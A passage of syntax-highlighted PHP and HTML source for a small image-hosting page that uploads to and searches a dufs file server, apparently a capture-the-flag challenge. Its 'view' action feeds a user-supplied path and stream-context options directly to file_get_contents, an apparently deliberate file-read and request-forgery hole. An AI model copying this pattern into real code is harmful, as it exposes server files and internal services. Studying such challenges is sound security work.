class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>        <span class="hljs-variable">$allowed_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION));<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_extension</span>, <span class="hljs-variable">$allowed_extensions</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许上传图片文件&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$target_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$filename</span>);<br>        <br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$target_url</span>);<br>        <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="hljs-string">&#x27;PUT&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$file_content</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Origin: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Referer: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: en,zh-CN;q=0.9,zh;q=0.8&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$file_content</span>)<br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传成功&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;未选择图片&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;search&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$search_query</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$search_query</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许输入数字和字母&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$search_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/?q=&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$search_query</span>) . <span class="hljs-string">&#x27;&amp;json&#x27;</span>;<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$search_url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span><br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-variable">$response_data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$response</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$image_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>                <br>                <span class="hljs-variable">$filtered_paths</span> = [];<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<br>                    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>                    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION));<br>                    <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$image_extensions</span>) || (<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;path_type&#x27;</span>] === <span class="hljs-string">&#x27;Directory&#x27;</span>)) &#123;<br>                        <span class="hljs-variable">$filtered_paths</span>[] = <span class="hljs-variable">$item</span>;<br>                    &#125;<br>                &#125;<br>                <br>                <span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] = <span class="hljs-variable">$filtered_paths</span>;<br>                <br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response_data</span>)]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-variable">$response</span>]);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;搜索失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入搜索关键词&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;view&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_content</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$base64_image</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_content</span>);<br>            <span class="hljs-variable">$mime_type</span> = <span class="hljs-string">&#x27;image/jpeg&#x27;</span>;<br>            <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>                <span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <br>                <span class="hljs-string">&#x27;is_image&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;base64_data&#x27;</span> =&gt; <span class="hljs-string">&#x27;data:&#x27;</span> . <span class="hljs-variable">$mime_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$base64_image</span><br>            ]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;无法获取图片&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入图片路径&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;迷你图片空间&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: <span class="hljs-number">800</span>px;<br>            margin: <span class="hljs-number">0</span> auto;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>        &#125;<br>        .section &#123;<br>            margin-bottom: <span class="hljs-number">30</span>px;<br>            padding: <span class="hljs-number">15</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            background-color: white;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>        &#125;<br>        h2 &#123;<br>            margin-top: <span class="hljs-number">0</span>;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        .form-group &#123;<br>            margin-bottom: <span class="hljs-number">15</span>px;<br>        &#125;<br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">5</span>px;<br>            font-weight: bold;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        input[type=<span class="hljs-string">&quot;text&quot;</span>], input[type=<span class="hljs-string">&quot;file&quot;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">8</span>px;<br>            box-sizing: border-box;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>        &#125;<br>        button &#123;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">15</span>px;<br>            background-color: <span class="hljs-comment">#4682b4;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#5f9ea0;</span><br>        &#125;<br>        .result &#123;<br>            margin-top: <span class="hljs-number">15</span>px;<br>            padding: <span class="hljs-number">10</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>            display: none;<br>        &#125;<br>        pre &#123;<br>            white-space: pre-wrap;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            max-height: <span class="hljs-number">300</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;迷你图片空间&lt;/h1&gt;<br>    <br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;上传图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadForm</span>&quot; <span class="hljs-title">enctype</span>=&quot;<span class="hljs-title">multipart</span>/<span class="hljs-title">form</span>-<span class="hljs-title">data</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">upload</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">file</span>&quot;&gt;选择图片：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">small</span>&gt;支持所有类型的图片&lt;/<span class="hljs-title">small</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;上传图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;搜索图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">search</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">query</span>&quot;&gt;搜索关键词：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">required</span> </span><br><span class="hljs-class">                       <span class="hljs-title">pattern</span>=&quot;[<span class="hljs-title">a</span>-<span class="hljs-title">zA</span>-<span class="hljs-title">Z0</span>-9]+&quot; </span><br><span class="hljs-class">                       <span class="hljs-title">title</span>=&quot;只允许输入数字和字母&quot;</span><br><span class="hljs-class">                       <span class="hljs-title">placeholder</span>=&quot;输入图片关键词（仅限数字和字母）&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;搜索&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;搜索结果：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResultContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;查看图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">view</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">filename</span>&quot;&gt;图片路径：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">placeholder</span>=&quot;输入图片路径&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;查看图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;图片预览：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">        <span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">uploadForm</span>&#x27;).<span class="hljs-title">addEventListener</span>(&#x27;<span class="hljs-title">submit</span>&#x27;, <span class="hljs-title">function</span>(<span class="hljs-title">e</span>) </span>&#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = data.message;<br>                resultDiv.style.color = data.success ? <span class="hljs-string">&#x27;green&#x27;</span> : <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = <span class="hljs-string">&#x27;上传过程中发生错误&#x27;</span>;<br>                resultDiv.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> searchQuery = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;query&#x27;</span>).value;<br>            <br>            <span class="hljs-keyword">var</span> alphanumericRegex = /^[a-zA-Z0-<span class="hljs-number">9</span>]+$/;<br>            <span class="hljs-keyword">if</span> (!alphanumericRegex.<span class="hljs-title function_ invoke__">test</span>(searchQuery)) &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span 